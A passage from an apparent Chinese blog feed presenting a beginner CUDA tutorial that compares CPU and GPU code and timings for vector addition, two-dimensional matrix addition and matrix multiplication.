class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;cuda_runtime.h&quot;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">__global__ void Plus(float A[], float B[], float C[], int n)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; blockDim.x * blockIdx.x + threadIdx.x;</span><br><span class="line">    C[i] &#x3D; A[i] + B[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line">    float*A, *Ad, *B, *Bd, *C, *Cd;</span><br><span class="line">    int n &#x3D; 1024 * 1024;</span><br><span class="line">    int size &#x3D; n * sizeof(float);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; CPU端分配内存</span><br><span class="line">    A &#x3D; (float*)malloc(size);</span><br><span class="line">    B &#x3D; (float*)malloc(size);</span><br><span class="line">    C &#x3D; (float*)malloc(size);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 初始化数组</span><br><span class="line">    for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] &#x3D; 90.0;</span><br><span class="line">        B[i] &#x3D; 10.0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; GPU端分配内存</span><br><span class="line">    cudaMalloc((void**)&amp;Ad, size);</span><br><span class="line">    cudaMalloc((void**)&amp;Bd, size);</span><br><span class="line">    cudaMalloc((void**)&amp;Cd, size);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; CPU的数据拷贝到GPU端</span><br><span class="line">    cudaMemcpy(Ad, A, size, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(Bd, B, size, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(Bd, B, size, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 定义kernel执行配置，（1024*1024&#x2F;512）个block，每个block里面有512个线程</span><br><span class="line">    dim3 dimBlock(512);</span><br><span class="line">    dim3 dimGrid(n&#x2F;512);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 执行kernel</span><br><span class="line">    Plus&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(Ad, Bd, Cd, n);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将在GPU端计算好的结果拷贝回CPU端</span><br><span class="line">    cudaMemcpy(C, Cd, size, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 校验误差</span><br><span class="line">    float max_error &#x3D; 0.0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        max_error +&#x3D; fabs(100.0 - C[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;max error is &quot; &lt;&lt; max_error &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 释放CPU端、GPU端的内存</span><br><span class="line">    free(A);</span><br><span class="line">    free(B);</span><br><span class="line">    free(C);</span><br><span class="line">    cudaFree(Ad);</span><br><span class="line">    cudaFree(Bd);</span><br><span class="line">    cudaFree(Cd);</span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse&#x2F;1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU方式输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max error is 0</span><br><span class="line">total time is 1278ms</span><br></pre></td></tr></table></figure><p>由上面的例子看出，使用CUDA编程时我们看不到for循环了，因为CPU编程的循环已经被分散到各个thread上做了，所以我们也就看到不到for一类的语句。从结果上看，CPU的循环计算的速度比GPU计算快多了，原因就在于CUDA中有大量的内存拷贝操作（数据传输花费了大量时间，而计算时间却非常少），如果计算量比较小的话，CPU计算会更合适一些。</p><p>下面计算一个稍微复杂的例子，矩阵加法，即对两个矩阵对应坐标的元素相加后的结果存储在第三个的对应位置的元素上。</p><p>值得注意的是，这个计算任务我采用了二维数组的计算方式，注意一下二维数组在CUDA编程中的写法。</p><p>CPU版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">#define ROWS 1024</span><br><span class="line">#define COLS 1024</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line">    int *A, **A_ptr, *B, **B_ptr, *C, **C_ptr;</span><br><span class="line">    int total_size &#x3D; ROWS*COLS*sizeof(int);</span><br><span class="line">    A &#x3D; (int*)malloc(total_size);</span><br><span class="line">    B &#x3D; (int*)malloc(total_size);</span><br><span class="line">    C &#x3D; (int*)malloc(total_size);</span><br><span class="line">    A_ptr &#x3D; (int**)malloc(ROWS*sizeof(int*));</span><br><span class="line">    B_ptr &#x3D; (int**)malloc(ROWS*sizeof(int*));</span><br><span class="line">    C_ptr &#x3D; (int**)malloc(ROWS*sizeof(int*));</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;CPU一维数组初始化</span><br><span class="line">    for(int i&#x3D;0;i&lt;ROWS*COLS;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] &#x3D; 80;</span><br><span class="line">        B[i] &#x3D; 20;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for(int i&#x3D;0;i&lt;ROWS;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A_ptr[i] &#x3D; A + COLS*i;</span><br><span class="line">        B_ptr[i] &#x3D; B + COLS*i;</span><br><span class="line">        C_ptr[i] &#x3D; C + COLS*i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for(int i&#x3D;0;i&lt;ROWS;i++)</span><br><span class="line">        for(int j&#x3D;0;j&lt;COLS;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            C_ptr[i][j] &#x3D; A_ptr[i][j] + B_ptr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#x2F;&#x2F;检查结果</span><br><span class="line">    int max_error &#x3D; 0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;ROWS*COLS;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;cout &lt;&lt; C[i] &lt;&lt; endl;</span><br><span class="line">        max_error +&#x3D; abs(100-C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; &quot;max_error is &quot; &lt;&lt; max_error &lt;&lt;endl;     </span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse&#x2F;1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CPU方式输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max_error is 0</span><br><span class="line">total time is 29ms</span><br></pre></td></tr></table></figure><p>GPU版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;cuda_runtime.h&quot;</span><br><span class="line">#include &quot;device_launch_parameters.h&quot;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt; </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">#define Row  1024</span><br><span class="line">#define Col 1024</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">__global__ void addKernel(int **C,  int **A, int ** B)</span><br><span class="line">&#123;</span><br><span class="line">    int idx &#x3D; threadIdx.x + blockDim.x * blockIdx.x;</span><br><span class="line">    int idy &#x3D; threadIdx.y + blockDim.y * blockIdx.y;</span><br><span class="line">    if (idx &lt; Col &amp;&amp; idy &lt; Row) &#123;</span><br><span class="line">        C[idy][idx] &#x3D; A[idy][idx] + B[idy][idx];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line"></span><br><span class="line">    int **A &#x3D; (int **)malloc(sizeof(int*) * Row);</span><br><span class="line">    int **B &#x3D; (int **)malloc(sizeof(int*) * Row);</span><br><span class="line">    int **C &#x3D; (int **)malloc(sizeof(int*) * Row);</span><br><span class="line">    int *dataA &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    int *dataB &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    int *dataC &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    int **d_A;</span><br><span class="line">    int **d_B;</span><br><span class="line">    int **d_C;</span><br><span class="line">    int *d_dataA;</span><br><span class="line">    int *d_dataB;</span><br><span class="line">    int *d_dataC;</span><br><span class="line">    &#x2F;&#x2F;malloc device memory</span><br><span class="line">    cudaMalloc((void**)&amp;d_A, sizeof(int **) * Row);</span><br><span class="line">    cudaMalloc((void**)&amp;d_B, sizeof(int **) * Row);</span><br><span class="line">    cudaMalloc((void**)&amp;d_C, sizeof(int **) * Row);</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataA, sizeof(int) *Row*Col);</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataB, sizeof(int) *Row*Col);</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataC, sizeof(int) *Row*Col);</span><br><span class="line">    &#x2F;&#x2F;set value</span><br><span class="line">    for (int i &#x3D; 0; i &lt; Row*Col; i++) &#123;</span><br><span class="line">        dataA[i] &#x3D; 90;</span><br><span class="line">        dataB[i] &#x3D; 10;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;将主机指针A指向设备数据位置，目的是让设备二级指针能够指向设备数据一级指针</span><br><span class="line">    &#x2F;&#x2F;A 和  dataA 都传到了设备上，但是二者还没有建立对应关系</span><br><span class="line">    for (int i &#x3D; 0; i &lt; Row; i++) &#123;</span><br><span class="line">        A[i] &#x3D; d_dataA + Col * i;</span><br><span class="line">        B[i] &#x3D; d_dataB + Col * i;</span><br><span class="line">        C[i] &#x3D; d_dataC + Col * i;</span><br><span class="line">    &#125;</span><br><span class="line">                                                                </span><br><span class="line">    cudaMemcpy(d_A, A, sizeof(int*) * Row, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(d_B, B, sizeof(int*) * Row, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(d_C, C, sizeof(int*) * Row, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(d_dataA, dataA, sizeof(int) * Row * Col, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(d_dataB, dataB, sizeof(int) * Row * Col, cudaMemcpyHostToDevice);</span><br><span class="line">    dim3 threadPerBlock(16, 16);</span><br><span class="line">    dim3 blockNumber( (Col + threadPerBlock.x - 1)&#x2F; threadPerBlock.x, (Row + threadPerBlock.y - 1) &#x2F; threadPerBlock.y );</span><br><span class="line">    printf(&quot;Block(%d,%d)   Grid(%d,%d).\n&quot;, threadPerBlock.x, threadPerBlock.y, blockNumber.x, blockNumber.y);</span><br><span class="line">    addKernel &lt;&lt; &lt;blockNumber, threadPerBlock &gt;&gt; &gt; (d_C, d_A, d_B);</span><br><span class="line">    &#x2F;&#x2F;拷贝计算数据-一级数据指针</span><br><span class="line">    cudaMemcpy(dataC, d_dataC, sizeof(int) * Row * Col, cudaMemcpyDeviceToHost);</span><br><span class="line">                                                                                             </span><br><span class="line">    int max_error &#x3D; 0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;Row*Col;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;printf(&quot;%d\n&quot;, dataC[i]);</span><br><span class="line">        max_error +&#x3D; abs(100-dataC[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;释放内存</span><br><span class="line">    free(A);</span><br><span class="line">    free(B);</span><br><span class="line">    free(C);</span><br><span class="line">    free(dataA);</span><br><span class="line">    free(dataB);</span><br><span class="line">    free(dataC);</span><br><span class="line">    cudaFree(d_A);</span><br><span class="line">    cudaFree(d_B);</span><br><span class="line">    cudaFree(d_C);</span><br><span class="line">    cudaFree(d_dataA);</span><br><span class="line">    cudaFree(d_dataB);</span><br><span class="line">    cudaFree(d_dataC);</span><br><span class="line"></span><br><span class="line">    printf(&quot;max_error is %d\n&quot;, max_error);</span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    printf(&quot;total time is %d ms\n&quot;, timeuse&#x2F;1000);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Block(16,16)   Grid(64,64).</span><br><span class="line">max_error is 0</span><br><span class="line">total time is 442 ms</span><br></pre></td></tr></table></figure><p>从结果看出，CPU计算时间还是比GPU的计算时间短。这里需要指出的是，这种二维数组的程序写法的效率并不高（虽然比较符合我们的思维方式），因为我们做了两次访存操作。所以一般而言，做高性能计算一般不会采取这种编程方式。</p><p>最后一个例子我们将计算一个更加复杂的任务，矩阵乘法</p><p>回顾一下矩阵乘法：两矩阵相乘，左矩阵第一行乘以右矩阵第一列（分别相乘，第一个数乘第一个数），乘完之后相加，即为结果的第一行第一列的数，依次往下算，直到计算完所有矩阵元素。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123226548-463149583.jpg"></p><p>CPU版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt;</span><br><span class="line"></span><br><span class="line">#define ROWS 1024</span><br><span class="line">#define COLS 1024</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void matrix_mul_cpu(float* M, float* N, float* P, int width)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i&#x3D;0;i&lt;width;i++)</span><br><span class="line">        for(int j&#x3D;0;j&lt;width;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            float sum &#x3D; 0.0;</span><br><span class="line">            for(int k&#x3D;0;k&lt;width;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                float a &#x3D; M[i*width+k];</span><br><span class="line">                float b &#x3D; N[k*width+j];</span><br><span class="line">                sum +&#x3D; a*b;</span><br><span class="line">            &#125;</span><br><span class="line">            P[i*width+j] &#x3D; sum;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line">    float *A, *B, *C;</span><br><span class="line">    int total_size &#x3D; ROWS*COLS*sizeof(float);</span><br><span class="line">    A &#x3D; (float*)malloc(total_size);</span><br><span class="line">    B &#x3D; (float*)malloc(total_size);</span><br><span class="line">    C &#x3D; (float*)malloc(total_size);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;CPU一维数组初始化</span><br><span class="line">    for(int i&#x3D;0;i&lt;ROWS*COLS;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] &#x3D; 80.0;</span><br><span class="line">        B[i] &#x3D; 20.0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    matrix_mul_cpu(A, B, C, COLS);</span><br><span class="line"></span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse&#x2F;1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CPU输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total time is 7617ms</span><br></pre></td></tr></table></figure><p>梳理一下CUDA求解矩阵乘法的思路：因为C=A×B，我们利用每个线程求解C矩阵每个(x, y)的元素，每个线程载入A的一行和B的一列，遍历各自行列元素，对A、B对应的元素做一次乘法和一次加法。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123238277-429965808.png"></p><p>GPU版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;cuda_runtime.h&quot;</span><br><span class="line">#include &quot;device_launch_parameters.h&quot;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt; </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">#define Row  1024</span><br><span class="line">#define Col 1024</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">__global__ void matrix_mul_gpu(int *M, int* N, int* P, int width)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; threadIdx.x + blockDim.x * blockIdx.x;</span><br><span class="line">    int j &#x3D; threadIdx.y + blockDim.y * blockIdx.y;</span><br><span class="line">                </span><br><span class="line">    int sum &#x3D; 0;</span><br><span class="line">    for(int k&#x3D;0;k&lt;width;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        int a &#x3D; M[j*width+k];</span><br><span class="line">        int b &#x3D; N[k*width+i];</span><br><span class="line">        sum +&#x3D; a*b;</span><br><span class="line">    &#125;</span><br><span class="line">    P[j*width+i] &#x3D; sum;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line"></span><br><span class="line">    int *A &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    int *B &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    int *C &#x3D; (int *)malloc(sizeof(int) * Row * Col);</span><br><span class="line">    &#x2F;&#x2F;malloc device memory</span><br><span class="line">    int *d_dataA, *d_dataB, *d_dataC;</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataA, sizeof(int) *Row*Col);</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataB, sizeof(int) *Row*Col);</span><br><span class="line">    cudaMalloc((void**)&amp;d_dataC, sizeof(int) *Row*Col);</span><br><span class="line">    &#x2F;&#x2F;set value</span><br><span class="line">    for (int i &#x3D; 0; i &lt; Row*Col; i++) &#123;</span><br><span class="line">        A[i] &#x3D; 90;</span><br><span class="line">        B[i] &#x3D; 10;</span><br><span class="line">    &#125;</span><br><span class="line">                                                                </span><br><span class="line">    cudaMemcpy(d_dataA, A, sizeof(int) * Row * Col, cudaMemcpyHostToDevice);</span><br><span class="line">    cudaMemcpy(d_dataB, B, sizeof(int) * Row * Col, cudaMemcpyHostToDevice);</span><br><span class="line">    dim3 threadPerBlock(16, 16);</span><br><span class="line">    dim3 blockNumber((Col+threadPerBlock.x-1)&#x2F; threadPerBlock.x, (Row+threadPerBlock.y-1)&#x2F; threadPerBlock.y );</span><br><span class="line">    printf(&quot;Block(%d,%d)   Grid(%d,%d).\n&quot;, threadPerBlock.x, threadPerBlock.y, blockNumber.x, blockNumber.y);</span><br><span class="line">    matrix_mul_gpu &lt;&lt; &lt;blockNumber, threadPerBlock &gt;&gt; &gt; (d_dataA, d_dataB, d_dataC, Col);</span><br><span class="line">    &#x2F;&#x2F;拷贝计算数据-一级数据指针</span><br><span class="line">    cudaMemcpy(C, d_dataC, sizeof(int) * Row * Col, cudaMemcpyDeviceToHost);</span><br><span class="line">                                                                                             </span><br><span class="line">    &#x2F;&#x2F;释放内存</span><br><span class="line">    free(A);</span><br><span class="line">    free(B);</span><br><span class="line">    free(C);</span><br><span class="line">    cudaFree(d_dataA);</span><br><span class="line">    cudaFree(d_dataB);</span><br><span class="line">    cudaFree(d_dataC);</span><br><span class="line"></span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    printf(&quot;total time is %d ms\n&quot;, timeuse&#x2F;1000);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block(16,16)   Grid(64,64).</span><br><span class="line">total time is 506 ms</span><br></pre></td></tr></table></figure><p>从这个矩阵乘法任务可以看出，我们通过GPU进行并行计算的方式仅花费了0.5秒，但是CPU串行计算方式却花费了7.6秒，计算速度提升了十多倍，可见并行计算的威力！</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>并行计算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我在北京实习的四个月</title>
